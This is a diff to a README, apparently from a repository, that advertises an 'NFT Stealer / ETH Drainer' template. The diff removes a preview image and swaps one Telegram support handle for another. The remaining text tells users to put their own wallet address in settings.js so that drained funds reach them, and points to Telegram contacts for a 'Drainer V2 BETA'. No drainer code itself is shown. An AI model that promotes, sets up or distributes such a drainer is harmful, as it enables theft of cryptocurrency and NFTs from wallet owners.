@@ -2,8 +2,6 @@
 ### If you need any help, DM me here: [@LiterSubject](https://t.me/LiterSubject) (new telegram)
 
 ## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer
-
-![preview](https://media.discordapp.net/attachments/986649854728089610/987037794805354546/unknown.png?width=1261&height=610)
 [Drainer V2 BETA](https://t.me/LiterSubject)
 
 ## `💡 Features`
@@ -20,7 +18,7 @@
 you need to edit the **settings.js** file. 
 - line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
 
-To get instant support, contact me on [@crypto_scem](https://t.me/crypto_scem)
+To get instant support, contact me on [@LiterSubject](https://t.me/LiterSubject)
 
 
 ## `⭐ Socials :`
